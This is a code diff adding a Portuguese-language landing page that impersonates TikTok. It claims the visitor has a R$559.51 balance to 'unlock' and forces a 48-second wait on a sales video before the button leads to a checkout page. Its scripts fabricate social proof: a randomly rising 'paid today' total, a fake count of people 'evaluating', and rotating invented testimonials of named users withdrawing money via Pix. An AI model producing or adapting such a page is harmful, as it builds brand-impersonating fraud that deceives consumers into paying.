@@ -1,0 +1,395 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <link href="cdn/shopifycloud/boomerang/shopify-boomerang-1.0.0.min.js" rel="preload" as="script">
+
+  <!-- Google Tag Manager -->
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-FZL0P8LE6G"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-FZL0P8LE6G');
+  </script>
+
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap">
+  <title>TikTok</title>
+  <link rel="icon" href="images/Logo%20TTK.png" type="image/x-icon">
+  
+  <script>
+    // Função para obter o valor de um cookie específico
+    function getCookie(name) {
+      const value = "; " + document.cookie;
+      const parts = value.split("; " + name + "=");
+      if (parts.length === 2) return parts.pop().split(";").shift();
+    }
+
+    // Atualiza o link do botão de checkout com o cookie 'src', se existir
+    document.addEventListener("DOMContentLoaded", function() {
+      const srcCookie = getCookie('src');
+      const checkoutLink = document.querySelector(".centralizar a");
+      if (checkoutLink && srcCookie) {
+        checkoutLink.href += (checkoutLink.href.includes('?') ? '&' : '?') + "src=" + srcCookie;
+      }
+    });
+  </script>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background-color: #FFFFFF;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    /* Cabeçalho */
+    .header {
+      width: 100%;
+      background-color: #ff0150;
+      color: white;
+      font-weight: bold;
+      text-align: center;
+      padding: 10px;
+      font-size: 16px;
+    }
+    /* Container Principal */
+    #p1 {
+      width: 100%;
+      max-width: 400px;
+      background-color: #FFFFFF;
+      padding: 15px;
+      border-bottom: 1px solid #202020;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+    #logo {
+      width: 130px;
+      margin-left: 5px;
+    }
+    .boxSaldo {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      border: 2px solid #ff0150;
+      border-radius: 6px;
+      padding: 5px 10px;
+      margin-right: 5px;
+    }
+    .textoSaldo {
+      font-size: 10px;
+      font-weight: bold;
+      background: #fff;
+      padding: 2px 14px;
+      color: #333;
+    }
+    .valorSaldo {
+      font-size: 14px;
+      font-weight: 700;
+      color: #333;
+    }
+    /* Conteúdo do Vídeo */
+    #produto1 {
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      padding: 15px;
+    }
+    #produto1 h4 {
+      color: #ff0150;
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+    #video-container {
+      width: 100%;
+      max-width: 360px;
+      margin: 0 auto;
+      overflow: hidden;
+      border: 2px solid #ff0150;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      position: relative;
+    }
+    video {
+      width: 350px;
+      display: block;
+    }
+    /* Botão */
+    .centralizar {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+    }
+    .centralizar a {
+      width: 100%;
+      text-decoration: none;
+      pointer-events: none;
+    }
+    button {
+      background-color: #999;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      width: 85%;
+      max-width: 300px;
+      height: 50px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: not-allowed;
+      transition: background-color 0.3s, transform 0.3s;
+    }
+    /* Estado ativo do botão */
+    button.enabled {
+      background-color: #ff0150;
+      cursor: pointer;
+      transform: scale(1.05);
+    }
+    /* Responsividade */
+    @media (max-width: 480px) {
+      #p1 {
+        flex-direction: row;
+        justify-content: space-between;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
+  </div>
+  <div id="p1">
+    <img id="logo" src="images/tiktoklogo.svg" alt="Spotify Logo">
+    <div class="boxSaldo">
+      <span class="textoSaldo">SALDO</span>
+      <span class="valorSaldo">R$ <span class="saldoAtualizado">559.51</span></span>
+    </div>
+  </div>
+  <div id="produto1">
+    <h4>DESBLOQUEIO DE SALDO</h4>
+    <p>Veja como liberar seu saque</p>
+    <p>assistindo ao vídeo.</p>
+    <div id="video-container">
+      <!-- Adicionado o atributo muted para permitir autoplay automático -->
+      <video src="media/vsl%20tiktok.mp4" controls="" autoplay="" muted="" poster="./images/capattk.png"></video>
+    </div>
+    <div class="centralizar">
+      <!-- A propriedade data-href guarda o destino original -->
+      <a id="unlockLink" data-href="../checkout/index.html">
+        <button id="unlockButton" disabled="">
+          Aguarde: 48s para desbloquear
+        </button>
+      </a>
+    </div>
+  </div>
+  
+  <script>
+    // Função para capturar UTMs da URL atual e montar a query string
+    function getUTMQuery() {
+      var utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];
+      var searchParams = new URLSearchParams(window.location.search);
+      var queryString = "";
+      utmParams.forEach(function(param) {
+        if (searchParams.has(param)) {
+          queryString += (queryString === "" ? "?" : "&") + param + "=" + encodeURIComponent(searchParams.get(param));
+        }
+      });
+      return queryString;
+    }
+    
+    // Timer de 1 minuto para liberar o botão e atualizar o destino com UTMs
+    document.addEventListener("DOMContentLoaded", function(){
+      var timeLeft = 48; // tempo em segundos
+      var unlockLink = document.getElementById("unlockLink");
+      var unlockButton = document.getElementById("unlockButton");
+
+      var timer = setInterval(function(){
+        timeLeft--;
+        unlockButton.textContent = "Aguarde: " + timeLeft + "s para desbloquear";
+          
+        if(timeLeft <= 0){
+          clearInterval(timer);
+          unlockButton.textContent = "DESBLOQUEAR AGORA";
+          // Atualiza o href do link adicionando os UTMs
+          unlockLink.href = unlockLink.getAttribute("data-href") + getUTMQuery();
+          unlockLink.style.pointerEvents = "auto";
+          unlockButton.disabled = false;
+          unlockButton.classList.add("enabled");
+        }
+      }, 1000);
+    });
+  </script>
+  
+  <script>
+    // Script para aplicar utm_source (se houver) aos outros links internos
+    (function() {
+      function getURLParameter(name) {
+        const params = new URLSearchParams(window.location.search);
+        return params.get(name);
+      }
+      const utmSource = getURLParameter('utm_source');
+      if (utmSource) {
+        const links = document.querySelectorAll('a[href^="/"], a[href^="."]');
+        links.forEach(link => {
+          const url = new URL(link.href, window.location.origin);
+          if (!url.searchParams.has('utm_source')) {
+            url.searchParams.set('utm_source', utmSource);
+          }
+          link.href = url.toString();
+        });
+        console.log('UTM Source aplicado aos links:', utmSource);
+      } else {
+        console.log('Nenhum UTM Source encontrado na URL.');
+      }
+    })();
+  </script>
+  
+  <!-- Pop-up de Depoimentos -->
+  <div id="testimonial-popup" class="testimonial-popup"></div>
+
+  <style>
+    /* Estilos para a barra de informações e pop-up de depoimentos */
+    .info-bar {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      background: #f8f9fa;
+      padding: 6px 12px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      border-bottom: 2px solid #ddd;
+      text-align: center;
+      white-space: nowrap;
+      margin-top: 20px;
+    }
+    .info-item {
+      display: flex;
+      align-items: center;
+      gap: 3px;
+    }
+    .info-item i {
+      color: #28a745;
+      font-size: 16px;
+    }
+    .testimonial-popup {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #ffffff;
+      color: #333;
+      padding: 12px 18px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.3);
+      font-size: 15px;
+      font-weight: bold;
+      display: none;
+      z-index: 9999;
+      text-align: center;
+      max-width: 90%;
+      animation: fadeInOut 5s ease-in-out;
+    }
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translateY(20px); }
+      10% { opacity: 1; transform: translateY(0); }
+      90% { opacity: 1; transform: translateY(0); }
+      100% { opacity: 0; transform: translateY(20px); }
+    }
+    @media screen and (max-width: 480px) {
+      .info-bar {
+        flex-wrap: nowrap;
+        overflow: hidden;
+        font-size: 12px;
+        padding: 5px 8px;
+      }
+      .info-item {
+        gap: 2px;
+      }
+      .info-item i {
+        font-size: 14px;
+      }
+    }
+  </style>
+
+  <script>
+    function animatePagoHoje() {
+      let valor = 26589.60;
+      setInterval(() => {
+        let incremento = (Math.random() * 50 + 10).toFixed(2);
+        valor += parseFloat(incremento);
+        document.getElementById("pago-hoje").innerHTML = `Pago hoje: R$ ${valor.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
+      }, 2000);
+    }
+
+    function animatePessoasAvaliando() {
+      let pessoas = 1669;
+      setInterval(() => {
+        let variacao = Math.floor(Math.random() * 50) - 10;
+        pessoas += variacao;
+        if (pessoas < 850) pessoas = 850;
+        document.getElementById("pessoas-avaliando").innerHTML = `Pessoas avaliando: ${pessoas}`;
+      }, 1500);
+    }
+
+    function showTestimonial() {
+      const testimonials = [
+        "⭐ Ana sacou <span style='color: #28a745;'>R$234</span> agora!",
+        "🔥 João acabou de sacar <span style='color: #28a745;'>R$870</span>!",
+        "💰 Maria recebeu <span style='color: #28a745;'>R$1.230</span> via Pix!",
+        "🎁 Pedro sacou <span style='color: #28a745;'>R$500</span> na sua conta!",
+        "🚀 Carla completou 4 pesquisas hoje!",
+        "💎 Felipe retirou <span style='color: #28a745;'>R$750</span> da plataforma!",
+        "🎉 Laura desbloqueou seu saldo de <span style='color: #28a745;'>R$1.100</span>!",
+        "⚡ Marcos finalizou 3 avaliações e já pode sacar!",
+        "💵 Bruna atingiu <span style='color: #28a745;'>R$600</span> acumulados!",
+        "🔥 Rafael conseguiu mais <span style='color: #28a745;'>R$450</span> em recompensas!"
+      ];
+      const testimonialPopup = document.getElementById("testimonial-popup");
+      const randomTestimonial = testimonials[Math.floor(Math.random() * testimonials.length)];
+      testimonialPopup.innerHTML = randomTestimonial;
+      testimonialPopup.style.display = "block";
+      setTimeout(() => {
+        testimonialPopup.style.display = "none";
+      }, 5000);
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+      animatePagoHoje();
+      animatePessoasAvaliando();
+      setInterval(showTestimonial, 7000);
+    });
+  </script>
+
+  <!-- Fim do bloco adicionado -->
+
+  <!-- (O restante do conteúdo do index permanece inalterado) -->
+  
+  <!-- Scripts e fechamento do body -->
+  <script src="hello-frontend.min.js%2540ver%253D3.1.1/index.html" id="hello-theme-frontend-js"></script>
+  <script src="jquery-numerator.min.js%2540ver%253D0.2.1/index.html" id="jquery-numerator-js"></script>
+  <script src="jquery.sticky.min.js%2540ver%253D3.24.4/index.html" id="e-sticky-js"></script>
+  <script src="webpack-pro.runtime.min.js%2540ver%253D3.24.4/index.html" id="elementor-pro-webpack-runtime-js"></script>
+  <script src="webpack.runtime.min.js%2540ver%253D3.24.7/index.html" id="elementor-webpack-runtime-js"></script>
+  <script src="frontend-modules.min.js%2540ver%253D3.24.7/index.html" id="elementor-frontend-modules-js"></script>
+  <script src="hooks.min.js%2540ver%253D2810c76e705dd1a53b18/index.html" id="wp-hooks-js"></script>
+  <script src="i18n.min.js%2540ver%253D5e580eb46a90c2b997e6/index.html" id="wp-i18n-js"></script>
+  <script id="wp-i18n-js-after">
+    wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+  </script>
+  <script src="frontend.min.js%2540ver%253D3.24.4/index.html" id="elementor-pro-frontend-js"></script>
+  <script src="core.min.js%2540ver%253D1.13.3/index.html" id="jquery-ui-core-js"></script>
+  <script id="elementor-frontend-js-before">
+    var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{/* ... */},"is_rtl":false,"breakpoints":{/* ... */},"responsive":{/* ... */},"version":"3.24.7","is_static":false,"experimentalFeatures":{/* ... */},"urls":{/* ... */},"nonces":{/* ... */},"swiperClass":"swiper","settings":{/* ... */},"kit":{/* ... */},"post":{/* ... */}};
+  </script>
+  <script src="elements-handlers.min.js%2540ver%253D3.24.4/index.html" id="pro-elements-handlers-js"></script>
+
+
+</body></html>
